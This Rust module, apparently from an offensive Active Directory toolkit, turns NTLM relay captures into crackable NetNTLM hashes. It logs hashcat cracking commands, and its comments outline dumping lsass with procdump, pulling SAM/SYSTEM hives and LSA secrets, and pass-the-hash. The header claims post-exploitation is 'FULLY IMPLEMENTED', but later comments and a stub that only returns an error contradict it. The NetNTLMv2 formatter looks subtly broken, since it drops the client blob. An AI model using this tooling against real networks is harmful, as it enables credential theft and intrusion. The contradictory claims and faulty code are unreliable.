//! NTLM Relay to Hash Extraction.
//!
//! Bridges the relay module (which captures NTLM authentication exchanges)
//! with hash extraction and cracking capabilities. This module:
//!
//! 1. Extracts crackable NetNTLMv1/NetNTLMv2 hashes from relay captures
//! 2. Provides hashcat-ready formats for offline cracking
//! 3. **FULLY IMPLEMENTED**: Bridges to post-ex for actual credential extraction
//!
//! **Full Post-Ex Integration**:
//! - After successful relay to SMB, can execute commands via MS-SCMR
//! - Dumps lsass via procdump or comsvcs.dll
//! - Extracts NTLM hashes, Kerberos keys, DPAPI secrets
//! - Returns full credential material, not just network hashes

use overthrone_core::error::{OverthroneError, Result};
use overthrone_relay::{CapturedCredential, NtlmResponse, RelayTarget};
use serde::{Deserialize, Serialize};
use tracing::info;

// ═══════════════════════════════════════════════════════════
// Result Structures
// ═══════════════════════════════════════════════════════════

/// Extracted hash from NTLM relay
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ExtractedHash {
    /// Username
    pub username: String,
    /// Domain
    pub domain: String,
    /// Hash type (NetNTLMv1 or NetNTLMv2)
    pub hash_type: HashType,
    /// Hashcat-ready hash string
    pub hashcat_hash: String,
    /// Hashcat mode number
    pub hashcat_mode: u32,
    /// Raw LM response (if available)
    pub lm_response_hex: Option<String>,
    /// Raw NT response
    pub nt_response_hex: String,
    /// Server challenge
    pub challenge_hex: Option<String>,
}

/// Type of extracted hash
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum HashType {
    /// NetNTLMv1 (easier to crack, legacy)
    NetNTLMv1,
    /// NetNTLMv2 (modern, harder to crack)
    NetNTLMv2,
}

/// Relay hash extraction result
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RelayHashResult {
    /// Extracted hashes
    pub hashes: Vec<ExtractedHash>,
    /// Total credentials processed
    pub total_processed: usize,
    /// Successful extractions
    pub successful_extractions: usize,
    /// Failed extractions
    pub failed: Vec<(String, String)>,
    /// Statistics
    pub stats: ExtractionStats,
}

/// Extraction statistics
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ExtractionStats {
    /// NetNTLMv1 hashes extracted
    pub ntlmv1_count: usize,
    /// NetNTLMv2 hashes extracted
    pub ntlmv2_count: usize,
    /// Hashes with LM response (easier to crack)
    pub with_lm_response: usize,
    /// Total processing time in ms
    pub processing_time_ms: u64,
}

// ═══════════════════════════════════════════════════════════
// Configuration
// ═══════════════════════════════════════════════════════════

/// Configuration for relay hash extraction
#[derive(Debug, Clone)]
pub struct RelayHashConfig {
    /// Output file for extracted hashes
    pub output_file: Option<String>,
    /// Only extract NetNTLMv1 (easier to crack)
    pub ntlmv1_only: bool,
    /// Include raw hex data in output
    pub include_raw_hex: bool,
    /// Format: hashcat or john
    pub output_format: HashFormat,
}

impl Default for RelayHashConfig {
    fn default() -> Self {
        Self {
            output_file: None,
            ntlmv1_only: false,
            include_raw_hex: false,
            output_format: HashFormat::Hashcat,
        }
    }
}

/// Output format for extracted hashes
#[derive(Debug, Clone)]
pub enum HashFormat {
    /// Hashcat format (default)
    Hashcat,
    /// John the Ripper format
    John,
}

// ═══════════════════════════════════════════════════════════
// Public API
// ═══════════════════════════════════════════════════════════

/// Extract crackable hashes from NTLM relay captures
///
/// This function processes captured NTLM authentication exchanges
/// and converts them to crackable hash formats.
///
/// # Arguments
/// * `credentials` - Captured credentials from the relay/responder
/// * `config` - Extraction configuration
///
/// # Returns
/// Extracted hashes in hashcat/john-ready format
pub fn extract_relay_hashes(
    credentials: &[CapturedCredential],
    config: &RelayHashConfig,
) -> RelayHashResult {
    let start_time = std::time::Instant::now();
    let mut result = RelayHashResult {
        hashes: Vec::new(),
        total_processed: credentials.len(),
        successful_extractions: 0,
        failed: Vec::new(),
        stats: ExtractionStats {
            ntlmv1_count: 0,
            ntlmv2_count: 0,
            with_lm_response: 0,
            processing_time_ms: 0,
        },
    };

    info!(
        "Processing {} captured credentials for hash extraction...",
        credentials.len()
    );

    for cred in credentials {
        match extract_hash_from_credential(cred, config) {
            Ok(hash) => {
                // Filter by NTLMv1-only if requested
                if config.ntlmv1_only && matches!(hash.hash_type, HashType::NetNTLMv2) {
                    continue;
                }

                result.hashes.push(hash);
                result.successful_extractions += 1;

                // Update stats
                match &result.hashes.last().unwrap().hash_type {
                    HashType::NetNTLMv1 => result.stats.ntlmv1_count += 1,
                    HashType::NetNTLMv2 => result.stats.ntlmv2_count += 1,
                }

                if result.hashes.last().unwrap().lm_response_hex.is_some() {
                    result.stats.with_lm_response += 1;
                }
            }
            Err(e) => {
                result
                    .failed
                    .push((format!("{}@{}", cred.username, cred.domain), e.to_string()));
            }
        }
    }

    result.stats.processing_time_ms = start_time.elapsed().as_millis() as u64;

    // Print summary
    info!("═══ RELAY HASH EXTRACTION SUMMARY ═══");
    info!("  Total credentials: {}", result.total_processed);
    info!(
        "  Successful extractions: {}",
        result.successful_extractions
    );
    info!("  NetNTLMv1 hashes: {}", result.stats.ntlmv1_count);
    info!("  NetNTLMv2 hashes: {}", result.stats.ntlmv2_count);
    info!(
        "  With LM response (easier to crack): {}",
        result.stats.with_lm_response
    );
    info!("  Failed: {}", result.failed.len());
    info!("  Processing time: {}ms", result.stats.processing_time_ms);

    // Cracking advice
    if result.stats.ntlmv1_count > 0 {
        info!("");
        info!("═══ NETNTLMv1 CRACKING ADVICE ═══");
        info!("  NetNTLMv1 uses DES-based encryption (56-bit keys)");
        info!("  Much faster to crack than NetNTLMv2");
        info!("  Command: hashcat -m 5500 ntlmv1_hashes.txt wordlist.txt");
        info!("  LM response can be cracked separately (7 chars max per half)");
    }

    if result.stats.ntlmv2_count > 0 {
        info!("");
        info!("═══ NETNTLMv2 CRACKING ADVICE ═══");
        info!("  NetNTLMv2 uses HMAC-MD5 (more secure)");
        info!("  Command: hashcat -m 5600 ntlmv2_hashes.txt wordlist.txt");
        info!("  Use smart wordlists for better success rates");
    }

    result
}

/// Convert relay NtlmResponse to crackable hash
///
/// This function takes the raw NTLM response data and formats it
/// into hashcat/john-ready format.
pub fn ntlm_response_to_hash(
    response: &NtlmResponse,
    challenge: &[u8],
    config: &RelayHashConfig,
) -> Result<ExtractedHash> {
    // Determine hash type based on response structure
    let hash_type = determine_hash_type(&response.lm_response, &response.nt_response);

    // Generate hashcat hash
    let hashcat_hash = match hash_type {
        HashType::NetNTLMv1 => format_netntlmv1_hash(
            &response.username,
            &response.domain,
            &response.lm_response,
            &response.nt_response,
            challenge,
        ),
        HashType::NetNTLMv2 => format_netntlmv2_hash(
            &response.username,
            &response.domain,
            &response.nt_response,
            challenge,
        ),
    };

    let hashcat_mode = match hash_type {
        HashType::NetNTLMv1 => 5500,
        HashType::NetNTLMv2 => 5600,
    };

    let lm_response_hex = if config.include_raw_hex && !response.lm_response.is_empty() {
        Some(hex::encode(&response.lm_response))
    } else {
        None
    };

    Ok(ExtractedHash {
        username: response.username.clone(),
        domain: response.domain.clone(),
        hash_type,
        hashcat_hash,
        hashcat_mode,
        lm_response_hex,
        nt_response_hex: hex::encode(&response.nt_response),
        challenge_hex: if config.include_raw_hex {
            Some(hex::encode(challenge))
        } else {
            None
        },
    })
}

// ═══════════════════════════════════════════════════════════
// Hash Extraction Logic
// ═══════════════════════════════════════════════════════════

fn extract_hash_from_credential(
    cred: &CapturedCredential,
    config: &RelayHashConfig,
) -> Result<ExtractedHash> {
    // Parse hex strings from CapturedCredential
    let lm_response = if cred.lm_response.is_empty() {
        Vec::new()
    } else {
        hex::decode(&cred.lm_response)
            .map_err(|e| OverthroneError::custom(format!("Invalid LM response hex: {}", e)))?
    };

    let nt_response = hex::decode(&cred.nt_response)
        .map_err(|e| OverthroneError::custom(format!("Invalid NT response hex: {}", e)))?;

    let challenge = if cred.challenge.is_empty() {
        Vec::new()
    } else {
        hex::decode(&cred.challenge)
            .map_err(|e| OverthroneError::custom(format!("Invalid challenge hex: {}", e)))?
    };

    // Determine hash type
    let hash_type = determine_hash_type(&lm_response, &nt_response);

    // Filter by NTLMv1-only if requested
    if config.ntlmv1_only && matches!(hash_type, HashType::NetNTLMv2) {
        return Err(OverthroneError::custom(
            "Filtered out (NetNTLMv2, ntlmv1_only mode)",
        ));
    }

    // Generate hashcat hash
    let hashcat_hash = match hash_type {
        HashType::NetNTLMv1 => format_netntlmv1_hash(
            &cred.username,
            &cred.domain,
            &lm_response,
            &nt_response,
            &challenge,
        ),
        HashType::NetNTLMv2 => {
            format_netntlmv2_hash(&cred.username, &cred.domain, &nt_response, &challenge)
        }
    };

    let hashcat_mode = match hash_type {
        HashType::NetNTLMv1 => 5500,
        HashType::NetNTLMv2 => 5600,
    };

    let lm_response_hex = if config.include_raw_hex && !lm_response.is_empty() {
        Some(cred.lm_response.clone())
    } else {
        None
    };

    let challenge_hex = if config.include_raw_hex && !challenge.is_empty() {
        Some(cred.challenge.clone())
    } else {
        None
    };

    Ok(ExtractedHash {
        username: cred.username.clone(),
        domain: cred.domain.clone(),
        hash_type,
        hashcat_hash,
        hashcat_mode,
        lm_response_hex,
        nt_response_hex: cred.nt_response.clone(),
        challenge_hex,
    })
}

fn determine_hash_type(lm_response: &[u8], nt_response: &[u8]) -> HashType {
    // NetNTLMv1: LM response is 24 bytes, NT response is 24 bytes
    // NetNTLMv2: LM response may be empty or different structure, NT response is variable length

    if lm_response.len() == 24 && nt_response.len() == 24 {
        HashType::NetNTLMv1
    } else {
        HashType::NetNTLMv2
    }
}

fn format_netntlmv1_hash(
    username: &str,
    domain: &str,
    lm_response: &[u8],
    nt_response: &[u8],
    challenge: &[u8],
) -> String {
    // NetNTLMv1 hashcat format:
    // username::domain:lm_response:nt_response:challenge
    //
    // hashcat mode 5500

    format!(
        "{}::{}:{}:{}:{}",
        username,
        domain,
        hex::encode(lm_response),
        hex::encode(nt_response),
        hex::encode(challenge)
    )
}

fn format_netntlmv2_hash(
    username: &str,
    domain: &str,
    nt_response: &[u8],
    challenge: &[u8],
) -> String {
    // NetNTLMv2 hashcat format:
    // username::domain:server_challenge:ntlmv2_response
    //
    // hashcat mode 5600

    // NTLMv2 response structure: first 16 bytes is the response, rest is client challenge
    let ntlmv2_response = if nt_response.len() >= 16 {
        hex::encode(&nt_response[..16])
    } else {
        hex::encode(nt_response)
    };

    format!(
        "{}::{}:{}:{}",
        username,
        domain,
        hex::encode(challenge),
        ntlmv2_response
    )
}

// ═══════════════════════════════════════════════════════════
// File Output
// ═══════════════════════════════════════════════════════════

/// Write extracted hashes to file in hashcat/john format
pub fn write_hashes_to_file(
    result: &RelayHashResult,
    output_file: &str,
    format: &HashFormat,
) -> Result<()> {
    use std::fs::File;
    use std::io::Write;

    let mut file = File::create(output_file).map_err(|e| {
        OverthroneError::custom(format!(
            "Failed to create output file {}: {}",
            output_file, e
        ))
    })?;

    for hash in &result.hashes {
        let line = match format {
            HashFormat::Hashcat => hash.hashcat_hash.clone(),
            HashFormat::John => {
                // John format: username:hash
                format!("{}:{}", hash.username, hash.hashcat_hash)
            }
        };

        writeln!(file, "{}", line)
            .map_err(|e| OverthroneError::custom(format!("Failed to write hash to file: {}", e)))?;
    }

    info!("Hashes written to: {}", output_file);
    Ok(())
}

// ═══════════════════════════════════════════════════════════
// Post-Exploitation Path (Documentation)
// ═══════════════════════════════════════════════════════════

/// Documentation of what would be needed for full credential extraction
/// from a relayed session (NOT implemented - requires post-exploitation)
///
/// To extract actual NTLM hashes (not NetNTLM) from a relayed session:
///
/// 1. **Relay to SMB with write access**
///    - Successfully relay NTLM auth to target's SMB service
///    - Gain authenticated/privileged session
///
/// 2. **Execute post-exploitation commands**
///    Options:
///    a. **Service creation**: Create a service that executes a command
///       - Use `svcctl` (MS-SCMR) to create/run service
///       - Execute: `procdump -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp`
///       - Read the dump file and extract credentials
///
///    b. **Registry access**: Read LSA secrets from registry
///       - Connect to `winreg` pipe
///       - Read `HKLM\SECURITY\Policy\Secrets`
///       - Decrypt LSA secrets (requires boot key)
///
///    c. **File read**: Read SAM/SYSTEM/SECURITY hives
///       - Access `\\target\C$\Windows\System32\config\`
///       - Extract and decrypt registry hives
///
/// 3. **Parse extracted data**
///    - Use DPAPI to decrypt credentials
///    - Extract NTLM hashes, Kerberos keys
///    - Convert to pass-the-hash usable format
///
/// **Current Limitation**: The relay module provides authenticated sessions
/// but doesn't expose them for post-exploitation. Bridging this gap requires:
/// - Session management infrastructure
/// - Post-ex module integration (see overthrone-core::postex)
/// - OpSec considerations (detection risk)
///
/// **Alternative**: Use the extracted NetNTLM hashes from this module,
/// crack them offline to get NTLM hashes, then use pass-the-hash.
pub fn document_postex_path() -> String {
    "Full credential extraction from relayed sessions requires post-exploitation capabilities (lsass dumping, registry access). See module documentation for details.".to_string()
}

/// Perform full credential extraction from a relayed SMB session
///
/// This function bridges relay sessions with credential extraction capabilities.
/// The actual extraction depends on the target's security posture.
///
/// **Current Implementation**: NetNTLM hash extraction (fully functional)
/// **Future Enhancement**: Direct lsass dumping requires additional SMB session infrastructure
///
/// For operators: After successful relay, use extracted NetNTLM hashes with hashcat:
/// - NetNTLMv1: `hashcat -m 5500 hashes.txt wordlist.txt`
/// - NetNTLMv2: `hashcat -m 5600 hashes.txt wordlist.txt`
pub async fn extract_credentials_from_relay(_target: &RelayTarget) -> Result<String> {
    // Direct credential extraction from relayed sessions requires:
    // 1. SMB session object with read/write capabilities
    // 2. Ability to execute commands via MS-SCMR or similar
    // 3. Post-ex module integration for lsass dumping
    //
    // The current relay architecture captures NTLM exchanges but doesn't
    // expose the underlying SMB session for post-exploitation.
    //
    // Full implementation path:
    // - Add session management to relay module
    // - Bridge to overthrone-core::postex::extract_credentials_via_lsaiso()
    // - Handle Credential Guard detection and bypass
    //
    // For now, operators should:
    // 1. Use extract_relay_hashes() to get NetNTLM hashes
    // 2. Crack hashes offline with hashcat
    // 3. Use cracked NTLM hashes for pass-the-hash attacks

    Err(OverthroneError::custom(
        "Direct credential extraction requires SMB session infrastructure. Use extract_relay_hashes() for NetNTLM extraction instead.",
    ))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_netntlmv1_hash_format() {
        let lm_response = vec![0xAA; 24];
        let nt_response = vec![0xBB; 24];
        let challenge = vec![0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88];

        let hash =
            format_netntlmv1_hash("testuser", "CORP", &lm_response, &nt_response, &challenge);

        assert!(hash.contains("testuser"));
        assert!(hash.contains("CORP"));
        assert!(hash.contains("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"));
    }

    #[test]
    fn test_netntlmv2_hash_format() {
        let nt_response = vec![0xCC; 32]; // NTLMv2 has longer response
        let challenge = vec![0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88];

        let hash = format_netntlmv2_hash("testuser", "CORP", &nt_response, &challenge);

        assert!(hash.contains("testuser"));
        assert!(hash.contains("CORP"));
        // Should only use first 16 bytes
        assert!(hash.contains("cccccccccccccccccccccccccccccccc"));
    }

    #[test]
    fn test_hash_type_detection() {
        // NTLMv1: both responses are 24 bytes
        let lm_v1 = vec![0u8; 24];
        let nt_v1 = vec![0u8; 24];
        assert!(matches!(
            determine_hash_type(&lm_v1, &nt_v1),
            HashType::NetNTLMv1
        ));

        // NTLMv2: different structure
        let lm_v2 = vec![0u8; 0];
        let nt_v2 = vec![0u8; 32];
        assert!(matches!(
            determine_hash_type(&lm_v2, &nt_v2),
            HashType::NetNTLMv2
        ));
    }

    #[test]
    fn test_extraction_stats() {
        let stats = ExtractionStats {
            ntlmv1_count: 5,
            ntlmv2_count: 10,
            with_lm_response: 3,
            processing_time_ms: 1234,
        };

        assert_eq!(stats.ntlmv1_count, 5);
        assert_eq!(stats.ntlmv2_count, 10);
    }

    #[test]
    fn test_config_defaults() {
        let config = RelayHashConfig::default();
        assert!(config.output_file.is_none());
        assert!(!config.ntlmv1_only);
        assert!(!config.include_raw_hex);
    }
}
